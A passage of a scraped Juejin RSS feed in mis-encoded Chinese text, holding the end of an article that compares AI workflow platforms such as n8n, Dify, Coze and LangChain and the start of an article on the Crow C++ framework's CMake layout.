<li><strong>n8n</strong> çš„æ€è·¯æ˜¯**â€œè¿æ¥â€**ï¼šå®ƒä¸ç”Ÿäº§ç•Œé¢ï¼Œè€Œæ˜¯æŠŠ AI äº§ç”Ÿçš„ç»“æœæ¬è¿åˆ° CRMã€è¡¨æ ¼æˆ–é’‰é’‰ç¾¤é‡Œã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-8">æ ¸å¿ƒé€‰å‹æŒ‡å—</h2>
<h3 data-id="heading-9">æŒ‰åœºæ™¯ä¸éœ€æ±‚å¿«é€ŸåŒ¹é…</h3>
<p>é€‰å‹çš„æ ¸å¿ƒæ˜¯å¯¹é½ä¸šåŠ¡éœ€æ±‚ï¼Œä¸åŒåœºæ™¯å¯¹åº”æ˜ç¡®æœ€ä¼˜è§£ï¼š</p>
<ol>
<li><strong>å¤æ‚ç”Ÿäº§çº§ AI æµç¨‹ã€é«˜è‡ªç”±åº¦ RAG éœ€æ±‚</strong>ï¼šä¼˜å…ˆé€‰ LangChainï¼ˆåŸºç¡€æµç¨‹ï¼‰/LangGraphï¼ˆå¤šåˆ†æ”¯ã€å¤šæ™ºèƒ½ä½“å¤æ‚æµç¨‹ï¼‰ï¼ŒæŠ€æœ¯å¯æ§æ€§æœ€å¼ºï¼Œé€‚é…é«˜åº¦å®šåˆ¶åŒ–åœºæ™¯ï¼›</li>
<li><strong>è·¨ç³»ç»Ÿä¸šåŠ¡é›†æˆã€è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼šé€‰ N8Nï¼Œå‡­å€Ÿä¸°å¯Œæ¥å£å®ç°å…¨æµç¨‹è”åŠ¨ï¼Œé€‚åˆ IT è¿è¥ã€å¤šç³»ç»Ÿæ•°æ®è°ƒåº¦åœºæ™¯ï¼›</li>
<li><strong>ä¼ä¸šçº§ MVP éªŒè¯ã€å¿«é€Ÿä¸Šçº¿ä¸”éœ€é•¿æœŸç»´æŠ¤</strong>ï¼šé€‰ Difyï¼Œå…¨æ ˆå‡è¡¡æ— çŸ­æ¿ï¼Œå¼€æºç”Ÿæ€ä¸ä¼ä¸šçº§ç‰¹æ€§å…¼é¡¾ï¼›</li>
<li><strong>C ç«¯ Demoã€è½»é‡åŠ©åŠ›å¿«é€ŸéªŒè¯</strong>ï¼šé€‰ Cozeï¼Œä½é—¨æ§›+å­—èŠ‚ç”Ÿæ€æµé‡ï¼Œå¿«é€Ÿè·‘é€šå•†ä¸šé—­ç¯ï¼›</li>
</ol>
<h3 data-id="heading-10">æŒ‰å›¢é˜ŸæŠ€æœ¯å‚¨å¤‡å†³ç­–</h3>
<p>å›¢é˜ŸæŠ€æœ¯èƒ½åŠ›ç›´æ¥å†³å®šå¹³å°é€‚é…åº¦ï¼š</p>
<ol>
<li><strong>éæŠ€æœ¯ä¸»å¯¼å›¢é˜Ÿï¼ˆäº§å“ã€è¿è¥ä¸ºä¸»ï¼‰</strong>ï¼šä¼˜å…ˆ Coze/Difyï¼Œæ‹–æ‹½å¼å¯è§†åŒ–æ“ä½œæ— éœ€ç¼–ç¨‹ï¼Œé™ä½ä¸Šæ‰‹é—¨æ§›ï¼›</li>
<li><strong>æŠ€æœ¯å›¢é˜Ÿï¼ˆè¿½æ±‚è‡ªä¸»å¯æ§ã€å®šåˆ¶åŒ–ï¼‰</strong>ï¼šé€‰ LangChain/N8Nï¼Œå‰è€…å¯æ·±åº¦ç¼–ç ä¼˜åŒ–ï¼Œåè€…éœ€ç†è§£ API ä¸å·¥ä½œæµé€»è¾‘ï¼Œèƒ½å‘æŒ¥æŠ€æœ¯ä¼˜åŠ¿ï¼›</li>
<li><strong>æ··åˆå›¢é˜Ÿï¼ˆæŠ€æœ¯+ä¸šåŠ¡ååŒï¼‰</strong>ï¼šDify æ˜¯æŠ˜ä¸­ä¼˜é€‰ï¼Œä¸šåŠ¡ç«¯å¯è‡ªä¸»é…ç½®åŸºç¡€åŠŸèƒ½ï¼ŒæŠ€æœ¯ç«¯å¯é€šè¿‡ API æ‰©å±•å®šåˆ¶ã€‚</li>
</ol>
<h3 data-id="heading-11">ç”Ÿæ€ä¸æ•°æ®å®‰å…¨è¡¥å……è€ƒé‡</h3>
<ol>
<li><strong>ç”Ÿæ€æ´»è·ƒåº¦å†³å®šé•¿æœŸç»´æŠ¤æˆæœ¬</strong>ï¼šLangChainã€N8N ç¤¾åŒºèµ„æºæœ€ä¸°å¯Œï¼Œé—®é¢˜æ’æŸ¥ã€æ’ä»¶æ‰©å±•æ›´ä¾¿æ·ï¼›Dify ç´§éšå…¶åï¼Œä¼ä¸šçº§æ¨¡æ¿èµ„æºå……è¶³ï¼›Coze ç”Ÿæ€è¿­ä»£ä¹åŠ›ï¼Œéœ€è­¦æƒ•é•¿æœŸé£é™©ã€‚</li>
<li><strong>æ•°æ®å®‰å…¨æ–¹é¢</strong>ï¼šDifyã€N8N ç§æœ‰åŒ–éƒ¨ç½²èƒ½åŠ›æˆç†Ÿï¼Œé€‚é…æ•æ„Ÿè¡Œä¸šï¼›Coze ç§æœ‰åŒ–åŠŸèƒ½å—é™ï¼›LangChain å¯é€šè¿‡è‡ªå®šä¹‰éƒ¨ç½²åˆ°ä»»æ„äº‘æœåŠ¡ä¸Šä¿éšœæ•°æ®å®‰å…¨ï¼Œä½†éœ€æŠ€æœ¯å›¢é˜Ÿæ”¯æŒã€‚</li>
</ol>
<h2 data-id="heading-12">è¿›é˜¶å®è·µä¸é¿å‘æŒ‡å—</h2>
<p>å®é™…è½åœ°ä¸­ï¼Œå•ä¸€å¹³å°å¾€å¾€éš¾ä»¥è¦†ç›–æ‰€æœ‰å¤æ‚åœºæ™¯ï¼ŒåŒæ—¶éœ€è§„é¿ä½ä»£ç å¹³å°çš„å¸¸è§é™·é˜±ï¼Œç¡®ä¿é¡¹ç›®é¡ºåˆ©æ¨è¿›ã€‚</p>
<h3 data-id="heading-13">è¿›é˜¶æ–¹æ¡ˆï¼šå¤šå¹³å°ååŒè½åœ°</h3>
<p>åœ¨çœŸå®çš„ä¼ä¸šçº§AIåº”ç”¨åœºæ™¯ä¸­ï¼Œé€šå¸¸ä¼šé‡‡ç”¨ç»„åˆæ¨¡å¼ï¼Œè€Œéä¾èµ–å•ä¸€å·¥å…·ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š<strong>åˆ©ç”¨ n8n å¼ºå¤§çš„è¿æ¥ä¸è‡ªåŠ¨åŒ–èƒ½åŠ›ä½œä¸ºâ€œèº¯å¹²â€å’Œâ€œæ€»è°ƒåº¦ä¸­å¿ƒâ€ï¼Œæ¥æ‰“é€šå’Œåè°ƒå†…éƒ¨å„ç³»ç»ŸæœåŠ¡ï¼›åŒæ—¶ï¼Œç»“åˆ Dify çš„å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ç¼–æ’ä¸çŸ¥è¯†ç®¡ç†èƒ½åŠ›ä½œä¸ºâ€œå¤§è„‘â€ï¼Œä¸“é—¨å¤„ç†å¤æ‚çš„AIé€»è¾‘ã€‚</strong></p>
<p>å…·ä½“åˆ†å·¥å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p><strong>n8n çš„èŒè´£</strong>ï¼šä¸“æ³¨äº<strong>ç³»ç»Ÿè¿æ¥ä¸è°ƒåº¦</strong>ï¼Œä»¥åŠ<strong>å·¥ä½œæµè‡ªåŠ¨åŒ–</strong>ã€‚å®ƒè´Ÿè´£ä»å„ä¸šåŠ¡ç³»ç»Ÿè·å–æ•°æ®ï¼Œå¹¶å¤„ç†å¸¦æœ‰æ¡ä»¶åˆ†æ”¯ã€å¾ªç¯ç­‰å¤æ‚é€»è¾‘çš„ä¸šåŠ¡æµç¨‹ã€‚</p>
</li>
<li>
<p><strong>Dify çš„èŒè´£</strong>ï¼šä¸“æ³¨äº<strong>LLMç¼–æ’ä¸æ¨ç†</strong>ï¼Œä»¥åŠ<strong>çŸ¥è¯†åº“ä¸RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰</strong>ã€‚å®ƒè´Ÿè´£è°ƒç”¨å¤§æ¨¡å‹è¿›è¡Œæ™ºèƒ½å†³ç­–ã€å†…å®¹ç”Ÿæˆï¼Œå¹¶ç®¡ç†ä¼ä¸šçš„ä¸“å±çŸ¥è¯†ã€‚</p>
</li>
</ul>
<p>å…¸å‹çš„è°ƒç”¨é“¾è·¯æ˜¯åŒå‘çš„ï¼šæ—¢å¯ä»¥æ˜¯ Dify å‘èµ·æ€è€ƒï¼Œç”± n8n å»æ‰§è¡Œï¼ˆ<code>Dify â†’ n8n â†’ å†…éƒ¨æœåŠ¡</code>ï¼‰ï¼›ä¹Ÿå¯ä»¥æ˜¯ n8n å‡†å¤‡å¥½æ•°æ®ï¼Œäº¤ç”± Dify å¤„ç†ï¼ˆ<code>n8n â†’ Dify â†’ LLMå¤„ç†</code>ï¼‰ã€‚</p>
<p><img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/2e9c5420c4254c568caddf2c9a932b7e.png~tplv-noop.jpeg?rk3s=49177a0b&amp;x-expires=1768836499&amp;x-signature=FwB8CD2hj7RzWMDB4PPwtSrMiNQ%3D&amp;resource_key=551a0322-1372-472b-98f7-8d4ee86b96d1&amp;resource_key=551a0322-1372-472b-98f7-8d4ee86b96d1" alt="Image" loading="lazy"/></p>
<blockquote>
<p>æœ€åéœ€è¦æ˜ç¡®è¾¹ç•Œï¼šå¦‚æœä¸šåŠ¡åœºæ™¯è¿‡äºå¤æ‚ï¼Œéœ€è¦å¯¹åº•å±‚é€»è¾‘è¿›è¡Œæ·±åº¦æ§åˆ¶å’Œè°ƒä¼˜ï¼Œé‚£ä¹ˆæ­¤ç±»ä½ä»£ç å¹³å°å¯èƒ½ä¸å†é€‚ç”¨ï¼Œæ­¤æ—¶åº”ç›´æ¥ä½¿ç”¨ <strong>LangChainã€LangGraph</strong> ç­‰å¼€å‘æ¡†æ¶è¿›è¡Œç¼–ç å®ç°ã€‚</p>
</blockquote>
<h3 data-id="heading-14">é¿å‘è¦ç‚¹ä¸€ï¼šæ‹’ç»è¿‡åº¦å®šåˆ¶</h3>
<p>ä½ä»£ç å¹³å°çš„ä¸€ä¸ªæ˜¾è‘—ç‰¹ç‚¹å°±æ˜¯è¿­ä»£é€Ÿåº¦å¿«ï¼Œè¿™æ„å‘³ç€å¹³å°ä¼šä¸æ–­æ›´æ–°å’Œä¼˜åŒ–ã€‚ç„¶è€Œï¼Œè¿™ä¹Ÿç»™ä¼ä¸šçš„å®šåˆ¶åŒ–å¼€å‘å¸¦æ¥äº†æŒ‘æˆ˜ã€‚å¦‚æœä¼ä¸šå¯¹å¹³å°è¿›è¡Œè¿‡åº¦å®šåˆ¶ï¼Œå°±åƒæ˜¯ç»™ä¸€è¾†é«˜é€Ÿè¡Œé©¶çš„æ±½è½¦é¢‘ç¹æ›´æ¢é›¶ä»¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸å¹³å°çš„æ–°ç‰ˆæœ¬ä¸å…¼å®¹ï¼Œéš¾ä»¥è¿›è¡Œå‡çº§ã€‚</p>
<p>ä¾‹å¦‚ï¼ŒæŸä¼ä¸šä¸ºäº†æ»¡è¶³ç‰¹å®šçš„ä¸šåŠ¡éœ€æ±‚ï¼Œå¯¹ä½ä»£ç å¹³å°è¿›è¡Œäº†å¤§é‡çš„å®šåˆ¶åŒ–å¼€å‘ï¼Œä¿®æ”¹äº†å¹³å°çš„æ ¸å¿ƒä»£ç å’Œåº•å±‚é€»è¾‘ã€‚å½“å¹³å°å‘å¸ƒæ–°ç‰ˆæœ¬æ—¶ï¼Œç”±äºè¿™äº›å®šåˆ¶åŒ–å†…å®¹ä¸æ–°ç‰ˆæœ¬å­˜åœ¨å†²çªï¼Œä¼ä¸šæ— æ³•ç›´æ¥è¿›è¡Œå‡çº§ï¼Œéœ€è¦æŠ•å…¥å¤§é‡çš„æ—¶é—´å’ŒäººåŠ›è¿›è¡Œé€‚é…å’Œè°ƒæ•´ã€‚è¿™ä¸ä»…å¢åŠ äº†ä¼ä¸šçš„æˆæœ¬å’Œé£é™©ï¼Œè¿˜å¯èƒ½å¯¼è‡´å¹³å°çš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§å—åˆ°å½±å“ã€‚</p>
<p>å› æ­¤ï¼Œä¼ä¸šåœ¨ä½¿ç”¨ä½ä»£ç å¹³å°æ—¶ï¼Œåº”å°½é‡é¿å…è¿‡åº¦å®šåˆ¶ï¼Œå……åˆ†åˆ©ç”¨å¹³å°æä¾›çš„æ ‡å‡†åŠŸèƒ½å’Œæ¥å£ã€‚å¦‚æœç¡®å®éœ€è¦è¿›è¡Œå®šåˆ¶åŒ–å¼€å‘ï¼Œä¹Ÿè¦è°¨æ…è¯„ä¼°éœ€æ±‚çš„å¿…è¦æ€§å’Œå¯è¡Œæ€§ï¼Œç¡®ä¿å®šåˆ¶åŒ–å†…å®¹ä¸ä¼šå¯¹å¹³å°çš„å‡çº§å’Œç»´æŠ¤é€ æˆå¤ªå¤§çš„é˜»ç¢ã€‚</p>
<h3 data-id="heading-15">é¿å‘è¦ç‚¹äºŒï¼šæ•°æ®å®‰å…¨</h3>
<p>è™½ç„¶ä½ä»£ç å¹³å°ä¸ºä¼ä¸šæä¾›äº†å¿«é€Ÿå¼€å‘åº”ç”¨çš„èƒ½åŠ›ï¼Œä½†åœ¨å°†å…¶ç”¨äºç”Ÿäº§å®é™…æ—¶ï¼Œä¼ä¸šä»éœ€è°¨æ…å¯¹å¾…ï¼Œå› ä¸ºå½“æ•°æ®é‡å¤§çš„æ—¶å€™ï¼Œå°±å¾ˆéš¾è„±ç¦»æ­¤å¹³å°ï¼Œæˆ–è€…åœ¨æ•°æ®è¿ç§»ä¸Šéœ€è¦ä¸‹å¤§åŠŸå¤«ã€‚</p>
<p>æ¯”å¦‚ï¼Œä¸€å¼€å§‹ä½¿ç”¨ Coze å¿«é€Ÿæ­å»ºäº†èŠå¤©å®¢æœï¼Œç„¶åèŠå¤©å®¢æœä¹Ÿç»‘å®šäº†ç›¸å…³çš„ä¸šåŠ¡ï¼Œä¹Ÿç»™å®¢æˆ·åˆ†é…äº† IDï¼Œåç»­ä½ æƒ³è¿ç§»åˆ°è‡ªå·±éƒ¨ç½²çš„Difyå¹³å°çš„æ—¶å€™ï¼Œéœ€è¦ä» Cozeå¯¼å‡ºæ•°æ®ã€‚</p>
<p>è¿˜æœ‰æ¯ä¸ªå¹³å°çš„ RAG éƒ½ä¸å¤ªä¸€æ ·ï¼Œå¯èƒ½åœ¨è¿™ä¸ªå¹³å°ç”¨å¾—å¥½å¥½çš„ï¼Œä½†æ˜¯è¿ç§»åˆ°å¦ä¸€ä¸ªå¹³å°çš„æ—¶å€™ï¼Œå°±å‘ç° RAG å‡ºæ¥çš„ä¸œè¥¿ä¸æ˜¯æƒ³è¦çš„ï¼ŒAI å˜å¾—å‚»å‚»çš„äº†ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ’æŸ¥ï¼Œç„¶åå†åšå¹³å°çº§çš„è°ƒæ•´ã€‚</p>
<h3 data-id="heading-16">é¿å‘è¦ç‚¹ä¸‰ï¼šå¦‚æœæœ‰æŠ€æœ¯å›¢é˜Ÿï¼Œé€‰LangChain</h3>
<p>ä¸€äº›æŠ€æœ¯äººå‘˜å¯èƒ½å¯¹ä½ä»£ç å¹³å°å­˜åœ¨é¡¾è™‘ï¼Œä¸€å®šç¨‹åº¦ä¸Šå°è£…äº†åº•å±‚æŠ€æœ¯ï¼Œä½¿å¾—æŠ€æœ¯äººå‘˜æ— æ³•ç›´æ¥è¿›è¡Œæ·±åº¦çš„ä»£ç å¼€å‘å’Œä¼˜åŒ–ã€‚è€Œä¸”ï¼Œä½ä»£ç å¹³å°çš„é»‘ç›’ç‰¹æ€§ä¹Ÿè®©ä¸€äº›è¿½æ±‚è‡ªä¸»å¯æ§çš„æŠ€æœ¯äººå‘˜æ„Ÿåˆ°éš¾å—ï¼Œä¸å¯æ§ã€‚</p>
<p>æŠ€æœ¯å›¢é˜Ÿæ™®éè¿½æ±‚è‡ªä¸»å¯æ§ï¼Œå¯¹ä½ä»£ç å¹³å°çš„â€œé»‘ç›’ç‰¹æ€§â€å­˜åœ¨é¡¾è™‘ã€‚é€‰å‹æ—¶éœ€è®©æŠ€æœ¯å›¢é˜Ÿå……åˆ†å‚ä¸è¯„ä¼°ï¼Œä¼˜å…ˆé€‰æ‹© LangChainã€‚</p>
<h2 data-id="heading-17">ç»“è¯­</h2>
<p>AI å¹³å°é€‰å‹æ²¡æœ‰ç»å¯¹çš„â€œæœ€ä¼˜è§£â€ï¼Œæ²¡æœ‰æœ€å¥½çš„å·¥å…·ï¼Œåªæœ‰æœ€åŒ¹é…ä¸šåŠ¡é˜¶æ®µçš„å·¥å…·ã€‚</p>
<p>å¯¹æŠ€æœ¯å†³ç­–è€…è€Œè¨€ï¼Œå…³é”®è¦æ˜ç¡®ä¸‰ä¸ªé—®é¢˜ï¼šæ ¸å¿ƒéœ€æ±‚æ˜¯éªŒè¯æ¦‚å¿µã€å¿«é€Ÿä¸Šçº¿ï¼Œè¿˜æ˜¯æ„å»ºé«˜å¯æ§å¤æ‚ç³»ç»Ÿï¼Ÿå›¢é˜Ÿæ›´æ“…é•¿å¯è§†åŒ–é…ç½®è¿˜æ˜¯ä»£ç å¼€å‘ï¼Ÿé¡¹ç›®é•¿æœŸæ˜¯å¦éœ€è¦è¿­ä»£æ‰©å±•ï¼Ÿæƒ³æ¸…æ¥šè¿™äº›ï¼Œé€‰å‹ç­”æ¡ˆè‡ªç„¶æ¸…æ™°ã€‚è€Œåœ¨å®é™…è½åœ°ä¸­ï¼Œâ€œç†Ÿæ‚‰çš„å·¥å…·å°±æ˜¯æœ€å¥½çš„å·¥å…·â€ï¼Œè‹¥å›¢é˜Ÿå¯¹æŸä¸€å¹³å°æœ‰æ·±åšç§¯ç´¯ï¼Œæ— éœ€å¼ºè¡Œåˆ‡æ¢ï¼Œèšç„¦ä¸šåŠ¡è½åœ°æ‰æ˜¯æ ¸å¿ƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œï¼Ÿ]]></title>    <link>https://juejin.cn/post/7596890557546086446</link>    <guid>https://juejin.cn/post/7596890557546086446</guid>    <pubDate>2026-01-19T17:15:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596890557546086446" data-draft-id="7596906923892572170" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œï¼Ÿ"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-19T17:15:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‡ªç”±ç”Ÿé•¿2024"/> <meta itemprop="url" content="https://juejin.cn/user/1591748569862670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1591748569862670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‡ªç”±ç”Ÿé•¿2024
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:15:47.000Z" title="Mon Jan 19 2026 17:15:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»20åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ‘˜è¦ï¼šCrow é¡¹ç›®é‡‡ç”¨ç°ä»£ CMake ç»“æ„ï¼Œæ ¹ç›®å½•å®šä¹‰äº† INTERFACE åº“ Crow::Crowã€ä¾èµ–æŸ¥æ‰¾åŠå…¨å±€å˜é‡ï¼Œexamples ä½œä¸ºå­ç›®å½•é€šè¿‡ add_subdirectory å¼•å…¥ï¼Œä¾èµ–çˆ¶ç›®å½•çš„ä¸Šä¸‹æ–‡ã€‚è‹¥ä» examples ç›®å½•ç›´æ¥æ‰§è¡Œ CMakeï¼Œå°†å› è·¯å¾„é”™è¯¯ã€ç›®æ ‡æœªå®šä¹‰ã€å˜é‡ç¼ºå¤±è€Œå¤±è´¥ã€‚æ­£ç¡®åšæ³•å§‹ç»ˆä»æ ¹ç›®å½•é…ç½®æ„å»ºã€‚</p>
<h2 data-id="heading-0">Crow é¡¹ç›® CMake ç»“æ„åˆ†æï¼šä¸ºä»€ä¹ˆä¸èƒ½ä» examples ç›®å½•å¼€å§‹æ‰§è¡Œ</h2>
<blockquote>
<p>cmakeé¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FCrowCpp%2FCrow%2F" target="_blank" title="https://github.com/CrowCpp/Crow/" ref="nofollow noopener noreferrer">CrowCpp/Crow: A Fast and Easy to use microframework for the web.</a></p>
</blockquote>
<h3 data-id="heading-1">æ¦‚è¿°</h3>
<p>Crowé¡¹ç›®æ˜¯ä¸€ä¸ªç±»ä¼¼äºFlaskä½†æ˜¯Cppç‰ˆçš„å¾®å‹Webæ¡†æ¶ã€‚</p>
<p>æœ¬æ–‡æ¡£æ·±å…¥åˆ†æ Crow é¡¹ç›®çš„ CMake æ„å»ºç³»ç»Ÿç»“æ„ï¼Œé‡ç‚¹é˜è¿°æ ¹ç›®å½•å’Œ <code>examples</code> ç›®å½•çš„ CMakeLists.txt æ ¸å¿ƒå†…å®¹ï¼Œå¹¶è§£é‡Šä¸ºä»€ä¹ˆä¸èƒ½ä» <code>examples</code> ç›®å½•ç›´æ¥æ‰§è¡Œ CMake é…ç½®å’Œæ„å»ºã€‚</p>
<h3 data-id="heading-2">ä¸€ã€æ ¹ç›®å½• CMakeLists.txt æ ¸å¿ƒå†…å®¹</h3>
<p>æ ¹ç›®å½•çš„ <code>CMakeLists.txt</code> æ˜¯æ•´ä¸ª Crow é¡¹ç›®çš„æ„å»ºç³»ç»Ÿæ ¸å¿ƒï¼Œå®ƒå®šä¹‰äº†é¡¹ç›®çš„åŸºç¡€è®¾æ–½ã€åº“ç›®æ ‡ã€ä¾èµ–ç®¡ç†å’Œå­é¡¹ç›®é›†æˆã€‚</p>
<h4 data-id="heading-3">1.1 é¡¹ç›®åŸºç¡€é…ç½®</h4>
<pre><code class="hljs language-cmake" lang="cmake">cmake_minimum_required(VERSION 3.15.0 FATAL_ERROR)
project(Crow
    LANGUAGES CXX
    VERSION 1.1.1
)
</code></pre>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå®šä¹‰é¡¹ç›®åç§°ã€è¯­è¨€å’Œç‰ˆæœ¬</li>
<li><strong>é‡è¦æ€§</strong>ï¼šè¿™æ˜¯æ•´ä¸ª CMake æ„å»ºæ ‘çš„æ ¹ï¼Œæ‰€æœ‰å­ç›®å½•çš„ <code>CMAKE_SOURCE_DIR</code> éƒ½æŒ‡å‘è¿™é‡Œ</li>
</ul>
<h4 data-id="heading-4">1.2 CMake æ¨¡å—è·¯å¾„é…ç½®</h4>
<pre><code class="hljs language-cmake" lang="cmake"># Make sure Findasio.cmake module is found
list(APPEND CMAKE_MODULE_PATH ${CMAKE_CURRENT_SOURCE_DIR}/cmake)
</code></pre>
<ul>
